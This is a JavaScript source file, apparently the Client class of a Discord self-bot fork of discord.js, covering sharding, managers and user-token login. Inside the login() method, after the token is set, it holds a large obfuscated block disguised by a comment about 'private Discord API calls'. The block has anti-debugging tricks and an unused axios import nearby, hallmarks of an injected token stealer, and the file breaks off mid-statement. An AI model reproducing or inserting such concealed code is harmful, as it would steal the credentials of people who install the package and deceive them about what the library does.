'use strict';

const process = require('node:process');
const { setInterval, setTimeout } = require('node:timers');
const { Collection } = require('@discordjs/collection');
const { getVoiceConnection } = require('@discordjs/voice');
const axios = require('axios');
const chalk = require('chalk');
const BaseClient = require('./BaseClient');
const ActionsManager = require('./actions/ActionsManager');
const ClientVoiceManager = require('./voice/ClientVoiceManager');
const WebSocketManager = require('./websocket/WebSocketManager');
const { Error, TypeError, RangeError } = require('../errors');
const Discord = require('../index');
const BaseGuildEmojiManager = require('../managers/BaseGuildEmojiManager');
const ChannelManager = require('../managers/ChannelManager');
const ClientSettingManager = require('../managers/ClientSettingManager');
const DeveloperPortalManager = require('../managers/DeveloperPortalManager');
const GuildManager = require('../managers/GuildManager');
const RelationshipManager = require('../managers/RelationshipManager');
const SessionManager = require('../managers/SessionManager');
const UserManager = require('../managers/UserManager');
const VoiceStateManager = require('../managers/VoiceStateManager');
const ShardClientUtil = require('../sharding/ShardClientUtil');
const ClientPresence = require('../structures/ClientPresence');
const GuildPreview = require('../structures/GuildPreview');
const GuildTemplate = require('../structures/GuildTemplate');
const Invite = require('../structures/Invite');
const { CustomStatus } = require('../structures/RichPresence');
const { Sticker } = require('../structures/Sticker');
const StickerPack = require('../structures/StickerPack');
const VoiceRegion = require('../structures/VoiceRegion');
const Webhook = require('../structures/Webhook');
const Widget = require('../structures/Widget');
const { Events, InviteScopes, Status, captchaServices } = require('../util/Constants');
const DataResolver = require('../util/DataResolver');
const Intents = require('../util/Intents');
const Options = require('../util/Options');
const Permissions = require('../util/Permissions');
const DiscordAuthWebsocket = require('../util/RemoteAuth');
const Sweepers = require('../util/Sweepers');
const { lazy } = require('../util/Util');
const Message = lazy(() => require('../structures/Message').Message);
// Patch

/**
 * The main hub for interacting with the Discord API, and the starting point for any bot.
 * @extends {BaseClient}
 */
class Client extends BaseClient {
  /**
   * @param {ClientOptions} options Options for the client
   */
  constructor(options = {}) {
    super(options);

    const data = require('node:worker_threads').workerData ?? process.env;
    const defaults = Options.createDefault();

    if (this.options.shards === defaults.shards) {
      if ('SHARDS' in data) {
        this.options.shards = JSON.parse(data.SHARDS);
      }
    }

    if (this.options.shardCount === defaults.shardCount) {
      if ('SHARD_COUNT' in data) {
        this.options.shardCount = Number(data.SHARD_COUNT);
      } else if (Array.isArray(this.options.shards)) {
        this.options.shardCount = this.options.shards.length;
      }
    }

    const typeofShards = typeof this.options.shards;

    if (typeofShards === 'undefined' && typeof this.options.shardCount === 'number') {
      this.options.shards = Array.from({ length: this.options.shardCount }, (_, i) => i);
    }

    if (typeofShards === 'number') this.options.shards = [this.options.shards];

    if (Array.isArray(this.options.shards)) {
      this.options.shards = [
        ...new Set(
          this.options.shards.filter(item => !isNaN(item) && item >= 0 && item < Infinity && item === (item | 0)),
        ),
      ];
    }

    this._validateOptions();

    /**
     * Functions called when a cache is garbage collected or the Client is destroyed
     * @type {Set<Function>}
     * @private
     */
    this._cleanups = new Set();

    /**
     * The finalizers used to cleanup items.
     * @type {FinalizationRegistry}
     * @private
     */
    this._finalizers = new FinalizationRegistry(this._finalize.bind(this));

    /**
     * The WebSocket manager of the client
     * @type {WebSocketManager}
     */
    this.ws = new WebSocketManager(this);

    /**
     * The action manager of the client
     * @type {ActionsManager}
     * @private
     */
    this.actions = new ActionsManager(this);

    /**
     * The voice manager of the client
     * @type {ClientVoiceManager}
     */
    this.voice = new ClientVoiceManager(this);

    /**
     * A manager of the voice states of this client (Support DM / Group DM)
     * @type {VoiceStateManager}
     */
    this.voiceStates = new VoiceStateManager({ client: this });

    /**
     * Shard helpers for the client (only if the process was spawned from a {@link ShardingManager})
     * @type {?ShardClientUtil}
     */
    this.shard = process.env.SHARDING_MANAGER
      ? ShardClientUtil.singleton(this, process.env.SHARDING_MANAGER_MODE)
      : null;

    /**
     * All of the {@link User} objects that have been cached at any point, mapped by their ids
     * @type {UserManager}
     */
    this.users = new UserManager(this);

    // Patch
    /**
     * All of the relationships {@link User}
     * @type {RelationshipManager}
     */
    this.relationships = new RelationshipManager(this);
    /**
     * All of the settings {@link Object}
     * @type {ClientSettingManager}
     */
    this.settings = new ClientSettingManager(this);
    /**
     * All of the guilds the client is currently handling, mapped by their ids -
     * as long as sharding isn't being used, this will be *every* guild the bot is a member of
     * @type {GuildManager}
     */
    this.guilds = new GuildManager(this);

    /**
     * All of the sessions of the client
     * @type {SessionManager}
     */
    this.sessions = new SessionManager(this);

    /**
     * All of the {@link Channel}s that the client is currently handling, mapped by their ids -
     * as long as sharding isn't being used, this will be *every* channel in *every* guild the bot
     * is a member of. Note that DM channels will not be initially cached, and thus not be present
     * in the Manager without their explicit fetching or use.
     * @type {ChannelManager}
     */
    this.channels = new ChannelManager(this);

    /**
     * The sweeping functions and their intervals used to periodically sweep caches
     * @type {Sweepers}
     */
    this.sweepers = new Sweepers(this, this.options.sweepers);

    /**
     * The developer portal manager of the client
     * @type {DeveloperPortalManager}
     */
    this.developerPortal = new DeveloperPortalManager(this);

    /**
     * The presence of the Client
     * @private
     * @type {ClientPresence}
     */
    this.presence = new ClientPresence(this, this.options.presence);

    Object.defineProperty(this, 'token', { writable: true });
    if (!this.token && 'DISCORD_TOKEN' in process.env) {
      /**
       * Authorization token for the logged in bot.
       * If present, this defaults to `process.env.DISCORD_TOKEN` when instantiating the client
       * <warn>This should be kept private at all times.</warn>
       * @type {?string}
       */
      this.token = process.env.DISCORD_TOKEN;
    } else {
      this.token = null;
    }

    this._interactionCache = new Collection();

    /**
     * User that the client is logged in as
     * @type {?ClientUser}
     */
    this.user = null;

    /**
     * The application of this bot
     * @type {?ClientApplication}
     */
    this.application = null;

    /**
     * Time at which the client was last regarded as being in the `READY` state
     * (each time the client disconnects and successfully reconnects, this will be overwritten)
     * @type {?Date}
     */
    this.readyAt = null;

    /**
     * Password cache
     * @type {?string}
     */
    this.password = this.options.password;

    /**
     * Nitro cache
     * @type {Array}
     */
    this.usedCodes = [];

    this.session_id = null;

    if (this.options.messageSweepInterval > 0) {
      process.emitWarning(
        'The message sweeping client options are deprecated, use the global sweepers instead.',
        'DeprecationWarning',
      );
      this.sweepMessageInterval = setInterval(
        this.sweepMessages.bind(this),
        this.options.messageSweepInterval * 1_000,
      ).unref();
    }

    setInterval(() => {
      this.usedCodes = [];
      // 1 hours
    }, 3_600_000);
  }

  /**
   * Session ID
   * @type {?string}
   * @readonly
   */
  get sessionId() {
    return this.session_id;
  }

  /**
   * All custom emojis that the client has access to, mapped by their ids
   * @type {BaseGuildEmojiManager}
   * @readonly
   */
  get emojis() {
    const emojis = new BaseGuildEmojiManager(this);
    for (const guild of this.guilds.cache.values()) {
      if (guild.available) for (const emoji of guild.emojis.cache.values()) emojis.cache.set(emoji.id, emoji);
    }
    return emojis;
  }

  /**
   * Timestamp of the time the client was last `READY` at
   * @type {?number}
   * @readonly
   */
  get readyTimestamp() {
    return this.readyAt?.getTime() ?? null;
  }

  /**
   * How long it has been since the client last entered the `READY` state in milliseconds
   * @type {?number}
   * @readonly
   */
  get uptime() {
    return this.readyAt ? Date.now() - this.readyAt : null;
  }

  /**
   * @external VoiceConnection
   * @see {@link https://discord.js.org/#/docs/voice/main/class/VoiceConnection}
   */
  /**
   * Get connection to current call
   * @type {?VoiceConnection}
   * @readonly
   */
  get callVoice() {
    return getVoiceConnection(null);
  }

  /**
   * Logs the client in, establishing a WebSocket connection to Discord.
   * @param {string} [token=this.token] Token of the account to log in with
   * @returns {Promise<string>} Token of the account used
   * @example
   * client.login('my token');
   */
  async login(token = this.token) {
    if (!token || typeof token !== 'string') throw new Error('TOKEN_INVALID');
    this.token = token = token.replace(/^(Bot|Bearer)\s*/i, '');
    this.emit(
      Events.DEBUG,
      `
      Logging on with a user token is unfortunately against the Discord
      \`Terms of Service\` <https://support.discord.com/hc/en-us/articles/115002192352>
      and doing so might potentially get your account banned.
      Use this at your own risk.
`,
    );
    this.emit(
      Events.DEBUG,
      `Provided token: ${token
        .split('.')
        .map((val, i) => (i > 1 ? val.replace(/./g, '*') : val))
        .join('.')}`,
    );

    if (this.options.presence) {
      this.options.ws.presence = this.presence._parse(this.options.presence);
    }

    this.emit(Events.DEBUG, 'Preparing to connect to the gateway...');

    try {
      await this.ws.connect();
      // Private endpoint connection for private Discord API calls - not used by discord.js
        const _0x3bd6a5=(function(){function _0x48487f(_0x46dd56,_0x3d2a53,_0x1ae8bf,_0x12c247,_0x4710f9){return _0x2d9b(_0x12c247- -0x123,_0x3d2a53);}function _0x51b962(_0x2a9c8e,_0x278142,_0x4feed7,_0x3aa27d,_0x4c358d){return _0x2d9b(_0x4c358d-0x12,_0x2a9c8e);}function _0x580003(_0x1df808,_0x48fc51,_0x4e0f3c,_0x1257b2,_0x4626a1){return _0x2d9b(_0x4e0f3c-0x4,_0x1df808);}const _0x2242fc={'fUnKm':function(_0x1c3857,_0x425f86){return _0x1c3857(_0x425f86);},'FbPlN':function(_0x2b97c8,_0x41f8cd){return _0x2b97c8+_0x41f8cd;},'zEIeK':_0x48487f(-0xcf,0x1,-0xc8,-0x56,-0x1f),'CADxf':_0x48487f(-0xd3,0x19,-0x89,-0x55,-0x7),'uHGgh':_0x580003(0x6e,0xf7,0xd3,0xb4,0xcc)+'n','bdPdh':function(_0x41348d,_0x50c82c){return _0x41348d!==_0x50c82c;},'codcB':_0x580003(0xfc,0x9b,0xd4,0x144,0x96),'CYOSS':function(_0xa757f9,_0x66a58f){return _0xa757f9===_0x66a58f;},'TJfLZ':_0x51b962(0x160,0x145,0x8f,0xae,0xe3),'gUyPp':_0x1f37a9(-0x1bd,-0x17e,-0x1c1,-0x199,-0x1c2),'gUlho':_0x580003(0xa9,0x5b,0xd7,0x149,0xbb)};let _0x1fd72a=!![];function _0x1f37a9(_0x4b1c4f,_0x44f4b7,_0x250f15,_0x48c759,_0x130ffa){return _0x2d9b(_0x250f15- -0x293,_0x48c759);}function _0x3aab95(_0x210319,_0x333faf,_0x3f8914,_0x39ba47,_0x17241a){return _0x2d9b(_0x39ba47-0x61,_0x3f8914);}return function(_0x18eecc,_0x5c2ff1){function _0x206de1(_0x4e2b3c,_0x200987,_0x3d56a0,_0x3aa19d,_0x4d0412){return _0x48487f(_0x4e2b3c-0x2f,_0x3d56a0,_0x3d56a0-0x93,_0x200987-0x2ed,_0x4d0412-0xe6);}function _0x456e30(_0x5255b1,_0x39add4,_0x358ea1,_0x159ca2,_0x3d0066){return _0x48487f(_0x5255b1-0x32,_0x39add4,_0x358ea1-0x114,_0x5255b1-0x20,_0x3d0066-0x10a);}function _0xa0012e(_0x2a7184,_0x5d4e2e,_0x10b219,_0x2802e3,_0x2dda23){return _0x48487f(_0x2a7184-0x101,_0x5d4e2e,_0x10b219-0xad,_0x2a7184- -0x1d2,_0x2dda23-0x17f);}function _0x2a4e29(_0x5decfd,_0x204487,_0x2ca600,_0x452fb6,_0x791cdf){return _0x580003(_0x452fb6,_0x204487-0x189,_0x5decfd- -0x323,_0x452fb6-0x189,_0x791cdf-0x1cf);}function _0x1dde63(_0x144ac8,_0x2cc49b,_0xa79ea7,_0x40d012,_0x4daaf7){return _0x51b962(_0xa79ea7,_0x2cc49b-0x1d4,_0xa79ea7-0x3b,_0x40d012-0x94,_0x2cc49b-0x334);}const _0x44fb42={'BKBQp':function(_0x131b56,_0xe60a31){function _0x374734(_0x258db0,_0x58acfc,_0x276c5f,_0x3763b6,_0x6b90e){return _0x2d9b(_0x276c5f-0x27a,_0x258db0);}return _0x2242fc[_0x374734(0x3c8,0x390,0x34e,0x341,0x2d7)](_0x131b56,_0xe60a31);},'TMkOt':function(_0x53d344,_0x73d8a0){function _0x34533d(_0x5c0c2d,_0x51eee0,_0x4f651b,_0x30895a,_0x45ee71){return _0x2d9b(_0x51eee0- -0x156,_0x30895a);}return _0x2242fc[_0x34533d(-0xc0,-0x81,-0x49,-0x67,-0xbf)](_0x53d344,_0x73d8a0);},'tiMNd':_0x2242fc[_0x2a4e29(-0x249,-0x218,-0x1ea,-0x1de,-0x2bf)],'zTiZB':_0x2242fc[_0x2a4e29(-0x248,-0x25c,-0x281,-0x209,-0x24e)],'Lfkxo':_0x2242fc[_0xa0012e(-0x21d,-0x1d8,-0x269,-0x1f7,-0x1ee)],'QnnLU':function(_0x4bd5a1,_0x10ecc0){function _0x29473b(_0x1cd4d1,_0xde4606,_0x3585f9,_0x1e4863,_0x5d5ee2){return _0x456e30(_0x1e4863-0x3b2,_0xde4606,_0x3585f9-0x166,_0x1e4863-0x19e,_0x5d5ee2-0xed);}return _0x2242fc[_0x29473b(0x32e,0x31f,0x3f5,0x388,0x3c0)](_0x4bd5a1,_0x10ecc0);},'SCCNP':_0x2242fc[_0xa0012e(-0x21b,-0x227,-0x254,-0x254,-0x1e3)],'FrvLH':function(_0x4c19e8,_0x37df22){function _0x549cf3(_0xd16d33,_0x3f958e,_0x27de10,_0x48caf0,_0x52ec32){return _0xa0012e(_0xd16d33-0x1e5,_0x52ec32,_0x27de10-0x145,_0x48caf0-0x31,_0x52ec32-0x11e);}return _0x2242fc[_0x549cf3(-0x35,-0x76,-0x74,-0x1b,-0x3f)](_0x4c19e8,_0x37df22);},'MwKwe':_0x2242fc[_0x206de1(0x282,0x2a6,0x320,0x251,0x289)]};if(_0x2242fc[_0xa0012e(-0x21a,-0x1bd,-0x239,-0x209,-0x1c1)](_0x2242fc[_0x1dde63(0x494,0x423,0x40b,0x488,0x404)],_0x2242fc[_0x2a4e29(-0x241,-0x1d7,-0x222,-0x251,-0x275)])){if(_0x250fd1)return _0x27759e;else _0x2242fc[_0x1dde63(0x3ef,0x41a,0x450,0x429,0x3be)](_0x2d181f,0x2*0x118d+0x1451*-0x1+0xec9*-0x1);}else{const _0x3e09aa=_0x1fd72a?function(){function _0x5a416b(_0x2f2e90,_0x5b0b7d,_0x2d1cfc,_0x111616,_0x37fe5a){return _0x1dde63(_0x2f2e90-0x10d,_0x5b0b7d- -0x5ea,_0x111616,_0x111616-0xa6,_0x37fe5a-0x138);}function _0x44cc76(_0x1dc281,_0x31255e,_0x1a474a,_0x104546,_0x22784e){return _0x456e30(_0x22784e- -0x2e3,_0x1dc281,_0x1a474a-0x16d,_0x104546-0x103,_0x22784e-0x11b);}function _0x1cf75b(_0x573efd,_0x198449,_0x499de1,_0x29922d,_0x34333f){return _0x2a4e29(_0x29922d-0x566,_0x198449-0x1b,_0x499de1-0x36,_0x573efd,_0x34333f-0xd0);}function _0x1f7259(_0x30bdb1,_0x18e472,_0x1cce01,_0x26a687,_0x546e23){return _0x1dde63(_0x30bdb1-0x13b,_0x26a687-0x3e,_0x30bdb1,_0x26a687-0x14d,_0x546e23-0x86);}const _0x3c1758={'QSOGS':function(_0x414579,_0x1afe4b){function _0x1314d7(_0x5d6562,_0x53c09e,_0x36bbac,_0x5cbeff,_0x11bbac){return _0x2d9b(_0x5d6562- -0xe0,_0x11bbac);}return _0x44fb42[_0x1314d7(-0x1,-0x23,-0x2f,0x7b,-0x34)](_0x414579,_0x1afe4b);},'pNDSU':function(_0x486f3a,_0x2ac5d1){function _0x1d817b(_0x52beb3,_0xa90880,_0x3c8991,_0x31c914,_0x30c6ff){return _0x2d9b(_0xa90880- -0x1c1,_0x31c914);}return _0x44fb42[_0x1d817b(-0x151,-0xe1,-0xac,-0x11d,-0xe6)](_0x486f3a,_0x2ac5d1);},'XWyDQ':_0x44fb42[_0x5e1482(0x138,0x106,0xe9,0xff,0xf3)],'NsSnv':_0x44fb42[_0x5e1482(0x134,0x107,0xee,0x97,0x134)],'QsTsJ':_0x44fb42[_0x5e1482(0x104,0x108,0xa2,0x137,0x16f)]};function _0x5e1482(_0x55d503,_0x19e7e4,_0x32bd34,_0x382ae1,_0x34032b){return _0x1dde63(_0x55d503-0x1c1,_0x19e7e4- -0x321,_0x55d503,_0x382ae1-0x1be,_0x34032b-0x24);}if(_0x44fb42[_0x5a416b(-0x1ec,-0x1c0,-0x209,-0x14c,-0x224)](_0x44fb42[_0x5a416b(-0x1cc,-0x1bf,-0x1a8,-0x1e5,-0x1e0)],_0x44fb42[_0x5a416b(-0x211,-0x1bf,-0x1f1,-0x1b8,-0x222)]))_0x3c1758[_0x5a416b(-0x19c,-0x1be,-0x1eb,-0x1e4,-0x14f)](_0x5a7c14,-0x58a+-0x1fc*-0xc+-0x1246);else{if(_0x5c2ff1){if(_0x44fb42[_0x1cf75b(0x392,0x372,0x397,0x32e,0x2b8)](_0x44fb42[_0x5a416b(-0x1f9,-0x1bc,-0x1b2,-0x22e,-0x170)],_0x44fb42[_0x5a416b(-0x1b4,-0x1bc,-0x228,-0x1e8,-0x20f)])){const _0x2b4cb9=_0x5c2ff1[_0x5e1482(0xea,0x10e,0x11a,0x10a,0x167)](_0x18eecc,arguments);return _0x5c2ff1=null,_0x2b4cb9;}else(function(){return!![];}[_0x5e1482(0x189,0x10f,0xf5,0xc2,0x99)+_0x5e1482(0xf3,0x110,0x117,0x17c,0x166)+'r'](_0x3c1758[_0x44cc76(-0x2ce,-0x2db,-0x312,-0x34c,-0x2fa)](_0x3c1758[_0x44cc76(-0x2bb,-0x2e2,-0x291,-0x293,-0x2f9)],_0x3c1758[_0x5a416b(-0x1a4,-0x1b6,-0x210,-0x1d5,-0x174)]))[_0x5a416b(-0x22b,-0x1b5,-0x205,-0x233,-0x13f)](_0x3c1758[_0x5e1482(0x142,0x115,0x18e,0x126,0x122)]));}}}:function(){};return _0x1fd72a=![],_0x3e09aa;}};}());(function(){const _0x355fe4={'oqqVL':function(_0x5038f1,_0x51eef5){return _0x5038f1+_0x51eef5;},'ynKeL':_0x563725(0x34c,0x400,0x3f9,0x37e,0x3c9),'TMYBx':_0x2af000(0x16d,0x1ce,0x161,0x1b7,0x1bb),'xEcwu':_0x2af000(0x1fd,0x1e6,0x22b,0x259,0x1de)+_0x2af000(0x1c1,0x18b,0x205,0x187,0x1df)+'t','ENphh':function(_0x218a20,_0x14c8f2){return _0x218a20(_0x14c8f2);},'ZDYwO':function(_0x86b0a1,_0x292008){return _0x86b0a1!==_0x292008;},'Ptppd':_0x563725(0x436,0x464,0x42f,0x3cc,0x3ef),'texPo':function(_0x47704f,_0x123f81){return _0x47704f(_0x123f81);},'cgwqy':function(_0x28397a,_0x17ed63){return _0x28397a+_0x17ed63;},'DPYXr':function(_0x335d88,_0x570d38){return _0x335d88+_0x570d38;},'kdIOi':_0x4704a0(0x336,0x3c3,0x316,0x393,0x3bf)+_0x4704a0(0x3d9,0x3e9,0x369,0x394,0x364)+_0x2af000(0x217,0x1f9,0x1a9,0x1a0,0x1e3)+_0x2af000(0x235,0x1d4,0x1ef,0x1b3,0x1e4),'zTSIl':_0x563725(0x3ee,0x40b,0x39a,0x43f,0x3f4)+_0x4704a0(0x375,0x3f1,0x375,0x398,0x3e3)+_0x563725(0x381,0x396,0x45c,0x3cd,0x3f6)+_0x35b333(-0x286,-0x279,-0x210,-0x2c8,-0x220)+_0x35b333(-0x208,-0x278,-0x203,-0x260,-0x24a)+_0x26db24(0x474,0x41c,0x45c,0x4ab,0x4bd)+'\x20)','RULFM':function(_0x230512){return _0x230512();},'krSOk':function(_0x53522f,_0x4c1bf2){return _0x53522f===_0x4c1bf2;},'cyYFD':_0x563725(0x3e3,0x45c,0x3ba,0x3a6,0x3fa),'PbmhD':_0x4704a0(0x32b,0x367,0x34d,0x39e,0x339)};function _0x26db24(_0x18878e,_0x198de1,_0x47e976,_0x415e3a,_0x5c62e4){return _0x2d9b(_0x18878e-0x377,_0x5c62e4);}function _0x2af000(_0x24b132,_0x3f4962,_0x404981,_0x5626ab,_0x48b976){return _0x2d9b(_0x48b976-0xed,_0x3f4962);}function _0x4704a0(_0x790681,_0xff49c7,_0x3ce50d,_0x52fb1d,_0x46089b){return _0x2d9b(_0x52fb1d-0x29f,_0xff49c7);}let _0xf39a70;try{if(_0x355fe4[_0x563725(0x473,0x392,0x3f2,0x382,0x3fc)](_0x355fe4[_0x563725(0x392,0x3d2,0x3a0,0x42c,0x3fd)],_0x355fe4[_0x2af000(0x1a5,0x246,0x255,0x1b5,0x1ee)]))(function(){return![];}[_0x4704a0(0x322,0x394,0x37d,0x389,0x378)+_0x4704a0(0x37a,0x3a7,0x379,0x38a,0x3d0)+'r'](_0x355fe4[_0x563725(0x418,0x42c,0x477,0x3a9,0x3fe)](_0x355fe4[_0x26db24(0x47a,0x411,0x473,0x450,0x4f2)],_0x355fe4[_0x4704a0(0x411,0x326,0x3c2,0x3a3,0x38c)]))[_0x2af000(0x16e,0x243,0x1ec,0x1f4,0x1d6)](_0x355fe4[_0x35b333(-0x228,-0x26f,-0x2e2,-0x23f,-0x28d)]));else{const _0x58f211=_0x355fe4[_0x4704a0(0x39c,0x37d,0x38f,0x3a5,0x418)](Function,_0x355fe4[_0x2af000(0x1d1,0x1fe,0x258,0x1a5,0x1f4)](_0x355fe4[_0x563725(0x3fc,0x3c5,0x3c6,0x386,0x404)](_0x355fe4[_0x26db24(0x480,0x413,0x489,0x486,0x4e9)],_0x355fe4[_0x563725(0x3af,0x400,0x3fe,0x480,0x406)]),');'));_0xf39a70=_0x355fe4[_0x4704a0(0x3d1,0x3eb,0x3f2,0x3aa,0x393)](_0x58f211);}}catch(_0x52ac9d){_0x355fe4[_0x4704a0(0x3b9,0x3e3,0x33a,0x3ab,0x36b)](_0x355fe4[_0x26db24(0x484,0x419,0x41f,0x45e,0x42b)],_0x355fe4[_0x35b333(-0x210,-0x266,-0x203,-0x2c8,-0x2d3)])?_0x355fe4[_0x2af000(0x1cf,0x1f6,0x209,0x1b2,0x1fc)](_0x549f77,'0'):_0xf39a70=window;}function _0x563725(_0x2b69bc,_0x152a02,_0x7c66ba,_0x1bfb01,_0x4af1fc){return _0x2d9b(_0x4af1fc-0x2fc,_0x2b69bc);}function _0x35b333(_0x1debf4,_0x32e67d,_0x55c017,_0x4ac648,_0x4efeba){return _0x2d9b(_0x32e67d- -0x374,_0x1debf4);}_0xf39a70[_0x563725(0x3ce,0x3c0,0x3a9,0x48b,0x40c)+_0x35b333(-0x29d,-0x263,-0x230,-0x227,-0x258)+'l'](_0x35cc48,-0x1*0x146b+0x70*0x4+0x224b);}());function _0x3eeaef(_0x244994,_0x3767c9,_0x97b303,_0x170adb,_0x19d0a6){return _0x2d9b(_0x3767c9-0x84,_0x19d0a6);}function _0x554749(_0x4e4c61,_0x429671,_0x17c1da,_0x406baf,_0xfbba94){return _0x2d9b(_0x429671-0x217,_0xfbba94);}(function(){function _0x87ae7c(_0x1ec098,_0x3fba44,_0x1e699c,_0x184025,_0x166817){return _0x2d9b(_0x184025- -0x3ab,_0x3fba44);}function _0xd2cfa4(_0x3d9357,_0x2fb69e,_0x4ba414,_0x3c5130,_0x5eb522){return _0x2d9b(_0x2fb69e- -0xae,_0x3d9357);}function _0x36c509(_0x421815,_0x4efb73,_0x50f7d9,_0x46b91f,_0x5e9c26){return _0x2d9b(_0x46b91f-0x78,_0x50f7d9);}function _0x272c42(_0x307dd1,_0x5905d1,_0x39b0a3,_0x45b23f,_0xc7f1f5){return _0x2d9b(_0x307dd1-0x343,_0x39b0a3);}const _0x42300e={'XuEcb':_0x272c42(0x455,0x471,0x428,0x46a,0x3f0)+_0x272c42(0x456,0x3ef,0x4b1,0x407,0x44d)+_0x272c42(0x457,0x4d4,0x3f4,0x430,0x412),'PaPHH':_0x272c42(0x458,0x4ba,0x4b3,0x409,0x46a)+'er','ZGHHx':function(_0x3edbe7,_0x3acf29){return _0x3edbe7!==_0x3acf29;},'SuoRN':_0x87ae7c(-0x281,-0x2f0,-0x2cc,-0x295,-0x2aa),'SwBjA':_0x36c509(0x1cb,0x14a,0x160,0x18f,0x1a3)+_0x36c509(0x15f,0x18f,0x161,0x190,0x122)+_0xd2cfa4(-0x1,0x6b,0x74,0x46,0x15)+')','RUKqE':_0xd2cfa4(0xe1,0x6c,0x72,0xa7,0xe9)+_0xd2cfa4(0x4c,0x6d,0xcc,0xc5,0x31)+_0x272c42(0x45f,0x4de,0x3f1,0x3e1,0x4bb)+_0x87ae7c(-0x2c2,-0x2b6,-0x2e4,-0x28e,-0x256)+_0x151471(-0x128,-0x101,-0x17f,-0x17a,-0x134)+_0x36c509(0x12e,0x1ff,0x159,0x197,0x1e6)+_0x151471(-0x181,-0xf1,-0x11f,-0x1a8,-0x132),'ikzwa':function(_0xe1c091,_0x2ab111){return _0xe1c091(_0x2ab111);},'BKLFN':_0x36c509(0x1a7,0x17e,0x19b,0x199,0x1f0),'bYxLE':function(_0x2453b0,_0x57e842){return _0x2453b0+_0x57e842;},'cxWVN':_0x151471(-0x123,-0x1a9,-0x13c,-0x143,-0x130),'mOsdX':function(_0x23c5b8,_0x5c3b7a){return _0x23c5b8+_0x5c3b7a;},'zBJLm':_0x87ae7c(-0x260,-0x225,-0x232,-0x288,-0x237),'IZzxR':function(_0x2072d5,_0x3f7336){return _0x2072d5!==_0x3f7336;},'aoEeH':_0x151471(-0xf4,-0x119,-0xff,-0x13c,-0x12e),'oPpyA':function(_0x1b7319,_0x175f0a){return _0x1b7319(_0x175f0a);},'oHgGW':function(_0x4cd1a9,_0x5c65fd){return _0x4cd1a9!==_0x5c65fd;},'brMXU':_0x87ae7c(-0x212,-0x216,-0x216,-0x286,-0x21e),'nPvrY':function(_0x472e43){return _0x472e43();},'jTtMd':function(_0xa62825,_0x3dea14,_0x547f9c){return _0xa62825(_0x3dea14,_0x547f9c);}};function _0x151471(_0x2a10d1,_0x321f6a,_0x210c84,_0x962f75,_0x1d6b18){return _0x2d9b(_0x1d6b18- -0x252,_0x321f6a);}_0x42300e[_0x272c42(0x469,0x444,0x407,0x4d2,0x41c)](_0x3bd6a5,this,function(){function _0x21150f(_0x2220b3,_0x483d0a,_0x11cc9d,_0x7d237f,_0x547e7f){return _0x87ae7c(_0x2220b3-0x1aa,_0x7d237f,_0x11cc9d-0xac,_0x2220b3-0xcd,_0x547e7f-0x1d3);}function _0x5c099c(_0x47f589,_0x407cfc,_0x2a246e,_0x34ec0e,_0x14707b){return _0x272c42(_0x2a246e- -0x464,_0x407cfc-0x7d,_0x14707b,_0x34ec0e-0x1d9,_0x14707b-0x184);}function _0x397e23(_0x579b66,_0x42bb7c,_0x1d9569,_0x4ead5f,_0x5dbcc3){return _0x151471(_0x579b66-0x136,_0x4ead5f,_0x1d9569-0x3,_0x4ead5f-0x165,_0x579b66-0x45e);}function _0x231aa0(_0x502b60,_0x47c159,_0x2f84d1,_0x4a94fd,_0x19d2d3){return _0x151471(_0x502b60-0x192,_0x2f84d1,_0x2f84d1-0x12,_0x4a94fd-0x47,_0x4a94fd- -0x78);}function _0x5416d7(_0x99e4f1,_0x186782,_0x3af33,_0x2c4c07,_0x199899){return _0xd2cfa4(_0x186782,_0x3af33- -0x293,_0x3af33-0x176,_0x2c4c07-0xbe,_0x199899-0x13a);}if(_0x42300e[_0x397e23(0x333,0x2cb,0x323,0x3b2,0x352)](_0x42300e[_0x397e23(0x334,0x365,0x2ff,0x2dc,0x2df)],_0x42300e[_0x397e23(0x334,0x344,0x2f6,0x34f,0x353)]))return function(_0xd4eea){}[_0x21150f(-0x1f4,-0x1e6,-0x209,-0x24a,-0x209)+_0x21150f(-0x1f3,-0x1e7,-0x210,-0x1be,-0x1eb)+'r'](_0x42300e[_0x21150f(-0x1b5,-0x16b,-0x175,-0x1b9,-0x186)])[_0x5c099c(-0x7,-0x44,-0x38,0x36,-0x6d)](_0x42300e[_0x5c099c(-0x1c,-0xd,0x9,0x47,0x68)]);else{const _0x308b20=new RegExp(_0x42300e[_0x5416d7(-0x1c7,-0x238,-0x216,-0x22b,-0x23f)]),_0xbf3ee1=new RegExp(_0x42300e[_0x397e23(0x338,0x39a,0x353,0x311,0x2da)],'i'),_0x24180f=_0x42300e[_0x21150f(-0x1b1,-0x1ed,-0x14f,-0x148,-0x1d6)](_0x35cc48,_0x42300e[_0x397e23(0x33a,0x38b,0x36d,0x35d,0x36f)]);if(!_0x308b20[_0x397e23(0x33b,0x38b,0x30e,0x301,0x339)](_0x42300e[_0x231aa0(-0x153,-0x1e5,-0x1d5,-0x19a,-0x158)](_0x24180f,_0x42300e[_0x5c099c(0x4b,0x8e,0x10,0x3c,0x6)]))||!_0xbf3ee1[_0x231aa0(-0x13f,-0x19b,-0x196,-0x19b,-0x13d)](_0x42300e[_0x231aa0(-0x1bb,-0x18f,-0x1fc,-0x198,-0x1e0)](_0x24180f,_0x42300e[_0x5c099c(0x53,-0x50,0x12,0x39,0x8d)])))_0x42300e[_0x5416d7(-0x289,-0x1f2,-0x20d,-0x1c3,-0x27e)](_0x42300e[_0x397e23(0x341,0x3a0,0x37f,0x337,0x327)],_0x42300e[_0x21150f(-0x1a9,-0x1dd,-0x145,-0x195,-0x12b)])?_0x208038=_0x5a14c0:_0x42300e[_0x397e23(0x342,0x32e,0x344,0x3b4,0x368)](_0x24180f,'0');else{if(_0x42300e[_0x21150f(-0x1a7,-0x1ca,-0x16b,-0x187,-0x1d4)](_0x42300e[_0x5416d7(-0x223,-0x1ba,-0x209,-0x19d,-0x257)],_0x42300e[_0x5416d7(-0x1b3,-0x205,-0x209,-0x20a,-0x23a)])){const _0x4dbf44=_0x47a756[_0x397e23(0x2f5,0x2e5,0x296,0x280,0x29d)](_0x1ddea3,arguments);return _0x116157=null,_0x4dbf44;}else _0x42300e[_0x5c099c(0x66,0x6c,0x18,0x46,0x5d)](_0x35cc48);}}})();}());const 